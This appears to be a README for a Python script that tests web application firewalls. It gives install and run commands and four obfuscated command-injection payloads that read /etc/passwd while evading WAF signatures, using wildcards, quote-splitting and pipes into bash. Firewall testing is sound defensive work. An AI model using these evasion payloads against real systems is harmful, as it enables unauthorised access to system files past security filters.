# WAF Bypass script

WAF bypass script written in Python3 is designed to test WAF.

A script developed for internal needs, including for testing Nemesis WAF and Nemesida WAF Free, but you can use it to test any WAF.

Do not break the law when using!

There are attacks for which it is impossible to create a signature, while not increasing the number of false positives. Therefore, it is absolutely normal that Nemesida WAF Free skips the attack, and the commercial version of Nemesida WAF Free blocks. For example, we can execute the <code>cat /etc/passwd</code> command in the following ways:
<pre>
%2f???%2f??t%20%2f???%2fp??s??
cat+/e't'c/pa'ss'wd
e'c'ho 'swd test pentest' |awk '{print "cat /etc/pas"$1}' | bash
ec'h'o 'cat /etc/examplewd' | sed 's/example/pass/g' | bash
</pre>

## How to run

<pre>
mkdir /opt/waf-bypass/
git clone https://github.com/nemesida-waf/waf_bypass.git /opt/waf-bypass/
python3 -m pip install -r /opt/waf-bypass/requirements.txt
cd /opt/waf-bypass/

python3 /opt/waf-bypass/main.py
</pre>
